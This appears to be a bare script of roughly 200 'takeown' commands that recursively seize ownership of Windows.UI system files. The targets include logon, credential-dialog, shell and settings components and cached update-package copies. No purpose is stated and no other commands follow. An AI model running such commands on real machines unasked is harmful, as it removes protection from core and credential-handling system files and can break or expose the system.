takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.3085_en-us_ebec9472220fccb9\f\Windows.UI.TaskManager.en-US.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.3085_none_8eff6b1166eefbd0\f\Windows.UI.TaskManager.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.3085_none_d303bc8cc4c7d6b7\f\Windows.UI.AppDefaults.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_970e83de6a05a9fd\f\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_970e83de6a05a9fd\f\Windows.UI.Xaml.Resources.Common.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.3085_en-us_be7ed3d378d84149\f\Windows.UI.SettingsAppThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.3085_none_fad69a9a12776d02\f\Windows.UI.SettingsAppThreshold.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.3085_none_9a026182b4fa1065\f\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_110acb7f83499050\f\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_110acb7f83499050\f\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.3085_en-us_e22057df2a3d015d\f\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.3085_none_00c4aed399529e96\f\Windows.UI.SettingsAdminFlowUIThreshold.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3085_none_28db717fd11ea409\f\Windows.UI.QuickActions.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3085_en-us_e1ffbc49d8a9196f\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.3085_none_dcf2fafd7a5e2e6e\f\Windows.UI.SoftLanding.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3085_none_5dff1e02ce871016\f\Windows.UI.SettingsHandlers-nt.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3085_en-us_1a0228b45205ac4c\f\Windows.UI.ShellCommon.en-US.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.3085_en-us_f3f91c5355a1ddd5\f\Windows.UI.Logon.en-US.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3085_none_670ccfae16aa6c34\f\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.3085_none_5d6757fbc44d56a2\f\Windows.UI.Logon.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.3085_none_5d6757fbc44d56a2\f\Windows.UI.Logon.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.3085_en-us_370656fdaee3e5d7\f\Windows.UI.PCShell.en-US.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.3085_none_f4b7447f323ee4ca\f\Windows.UI.PCShell.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3085_none_b4839d6e2e3ceff5\f\Windows.UI.ShellCommon.pri" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.3085_none_e5de8b43cd7cd99c\f\Windows.UI.Storage.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3085_none_a1632e309e666bf8\f\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_1b5f75d1b7aa524b\f\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.3085_none_1b5f75d1b7aa524b\f\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\SoftwareDistribution\Download\a4b2dc6d30c7394990a477edf80c5ddf\Package_for_RollupFix~~amd64~~22621.3085.1.19\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3085_none_71617a004b0b2e2f\f\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Accessibility.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.AppDefaults.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.BioFeedback.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.BlockedShutdown.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Cred.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.CredDialogController.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.FileExplorer.WASDK.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Immersive.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Input.Inking.Analysis.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Input.Inking.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Logon.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.NetworkUXController.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.PicturePassword.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Search.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Shell.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Shell.Internal.AdaptiveCards.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Storage.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Controls.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.InkControls.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Maps.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Phone.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.19h1.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.21h1.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.Common.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.rs1.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.rs2.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.rs3.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.rs4.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.rs5.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.th.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.win81.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.Xaml.Resources.win8rtm.dll" /r /d y
takeown /f "C:\Windows\System32\Windows.UI.XamlHost.dll" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.AppDefaults.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.CredDialogController.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.FileExplorer.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.FileExplorer.WASDK.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.Immersive.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.Input.Inking.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.PicturePassword.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.Xaml.Controls.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.Xaml.InkControls.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.Xaml.Maps.dll.mui" /r /d y
takeown /f "C:\Windows\System32\en-US\Windows.UI.Xaml.Phone.dll.mui" /r /d y
takeown /f "C:\Windows\System32\ShellExperiences\Windows.UI.Shell.SharedUtilities.dll" /r /d y
takeown /f "C:\Windows\System32\WinMetadata\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\System32\WinMetadata\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.ActionCenter.dll" /r /d y
takeown /f "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.QuickActions.dll" /r /d y
takeown /f "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\Windows.UI.SoftLanding.dll" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BioFeedback" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BlockedShutdown" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Cred" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Immersive.dll.mun" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Logon" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PCShell" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PrintDialog" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsHandlers-nt" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Shell" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommon" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.TaskManager" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\PRIS" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Windows.UI.AccountsControl.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-250.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-300.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Dark_Scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-250.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-300.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Advanced.Theme-Light_Scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-250.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-300.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Dark_Scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-250.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-300.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Exchange.Theme-Light_Scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-250.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-300.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Dark_Scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-250.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-300.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Generic.Theme-Light_Scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-250.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-300.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Dark_Scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-125.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-150.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-200.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-250.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-300.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\Images\Outlook.Theme-Light_Scale-400.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.AccountsControl\PRIS\Windows.UI.AccountsControl.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BioFeedback\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BioFeedback\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BioFeedback\Windows.UI.BioFeedback.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BioFeedback\Fonts\NUIMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BioFeedback\pris\Windows.UI.BioFeedback.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\Windows.UI.BlockedShutdown.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.BlockedShutdown\pris\Windows.UI.BlockedShutdown.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Cred\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Cred\Windows.UI.Cred.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Cred\pris\Windows.UI.Cred.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Logon\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Logon\Windows.UI.Logon.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Logon\pris\Windows.UI.Logon.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PCShell\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PCShell\Windows.UI.PCShell.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PCShell\PeoplePane\Assets\SharMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PCShell\pris\Windows.UI.PCShell.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PrintDialog\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PrintDialog\Windows.UI.PrintDialog.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.PrintDialog\pris\Windows.UI.PrintDialog.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Windows.UI.Search.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-140.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-180.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-black_scale-80.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-140.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-180.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.contrast-white_scale-80.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-100.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-140.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-180.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\Images\logo.scale-80.png" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.Search\pris\Windows.UI.Search.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\Windows.UI.SettingsAdminFlowUIThreshold.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\pris\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAdminFlowUIThreshold\SystemSettingsThresholdAdminFlowUI\Assets\Fonts\SetMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\pris" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\Windows.UI.SettingsAppThreshold.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\pris\Windows.UI.SettingsAppThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\EdrCalibration.mkv" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\HDRSample.mkv" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\SDRSample.mkv" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\AXPIcons.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\AXPMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\BitMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\MemMDL2.2.2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\SetMDL2.ttf" /r /d y
takeown /f "C:\Windows\SystemResources\Windows.UI.SettingsAppThreshold\SystemSettings\Assets\Fonts\SettingsIcons.ttf" /r /d y
